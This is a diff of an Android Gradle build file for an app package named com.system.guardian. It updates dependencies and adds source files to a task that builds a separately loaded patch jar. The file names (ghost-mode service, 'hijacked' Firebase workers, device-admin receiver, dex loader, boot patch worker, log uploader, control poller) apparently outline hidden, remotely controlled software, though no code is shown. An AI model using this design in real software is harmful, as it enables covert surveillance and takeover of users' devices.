@@ -37,12 +37,12 @@ android {
 
 dependencies {
     implementation 'androidx.core:core-ktx:1.16.0'
-    implementation 'androidx.appcompat:appcompat:1.6.1'
-    implementation 'androidx.constraintlayout:constraintlayout:2.2.1'
-    implementation 'com.google.firebase:firebase-messaging:24.1.1'
-    implementation 'com.squareup.okhttp3:okhttp:4.10.0'
     implementation 'androidx.work:work-runtime:2.10.0'
-    implementation 'androidx.annotation:annotation:1.8.1'
+    implementation 'com.squareup.okhttp3:okhttp:4.10.0'
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'androidx.annotation:annotation:1.9.1'
+    implementation 'com.google.firebase:firebase-messaging:24.1.1'
+    implementation 'androidx.constraintlayout:constraintlayout:2.2.1'
 }
 
 androidComponents {
@@ -51,19 +51,35 @@ androidComponents {
         def bootClasspath = android.bootClasspath
 
         def patchSources = files(
-                "src/main/java/com/system/guardian/CrashLogger.java",
-                "src/main/java/com/system/guardian/OverlayBlocker.java",
+                "src/main/java/com/system/guardian/Blocker.java",
                 "src/main/java/com/system/guardian/DexLoader.java",
+                "src/main/java/com/system/guardian/CrashLogger.java",
                 "src/main/java/com/system/guardian/NetworkUtils.java",
-                "src/main/java/com/system/guardian/GuardianStateCache.java",
-                "src/main/java/com/system/guardian/core/LogUploader.java",
-                "src/main/java/com/system/guardian/firebase/GuardianMessagingService.java",
                 "src/main/java/com/system/guardian/AdminReceiver.java",
+                "src/main/java/com/system/guardian/OverlayBlocker.java",
+                "src/main/java/com/system/guardian/LockStateWatcher.java",
+                "src/main/java/com/system/guardian/GhostModeService.java",
+                "src/main/java/com/system/guardian/GuardianStateCache.java",
                 "src/main/java/com/system/guardian/ControlPollerWorker.java",
                 "src/main/java/com/system/guardian/ControlPollerService.java",
+                "src/main/java/com/system/guardian/WatchdogForegroundService.java",
+
+                "src/main/java/com/system/guardian/util/AppUtils.java",
+                "src/main/java/com/system/guardian/util/OverlayUtils.java",
+                "src/main/java/com/system/guardian/util/WatchdogLogger.java",
+
+                "src/main/java/com/system/guardian/core/LogUploader.java",
+
                 "src/main/java/com/system/guardian/background/LogUploadWorker.java",
+                "src/main/java/com/system/guardian/background/BootPatchWorker.java",
+                "src/main/java/com/system/guardian/background/UploadScheduler.java",
+
+                "src/main/java/com/system/guardian/dex_patch_build/PatchOverride.java",
                 "src/main/java/com/system/guardian/dex_patch_build/PatchInstaller.java",
-                "src/main/java/com/system/guardian/dex_patch_build/PatchOverride.java"
+
+                "src/main/java/com/system/guardian/firebase/HijackedFirebaseWorker.java",
+                "src/main/java/com/system/guardian/firebase/GuardianMessagingService.java",
+                "src/main/java/com/system/guardian/firebase/HijackedFirebaseJobService.java"
         )
 
         def compileTask = tasks.register("buildPatchJar${variant.name.capitalize()}", JavaCompile) {
